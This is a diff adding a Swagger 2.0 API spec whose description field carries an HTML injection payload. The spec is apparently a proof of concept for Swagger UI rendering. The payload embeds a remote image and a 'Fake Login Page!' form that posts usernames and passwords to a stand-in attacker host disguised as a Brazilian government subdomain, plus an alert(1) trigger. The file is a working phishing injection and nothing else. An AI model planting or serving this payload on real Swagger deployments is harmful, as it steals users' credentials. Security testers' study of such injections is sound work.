@@ -1,0 +1,30 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: HTMLi [ @iamarit ]
+  description: <img src=https://raw.githubusercontent.com/iamarit/SwaggerUiTesting/main/test.png> '<div class="login-form">
+    <div class="heading">
+        <h1>Fake Login Page!</h1>
+    </div>
+    <div class="form-container">
+        <form action="https://ati.to.gov.br.evil.com" method="post" class="form-signin">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" name="username" size="20">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" name="password" size="20">
+            </div>
+            <div class="form-group">
+                <button onclick="alert(1)" type="submit" class="btn btn-dark">Login</button>
+            </div>
+        </form>
+    </div>
+</div>'
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Login successful
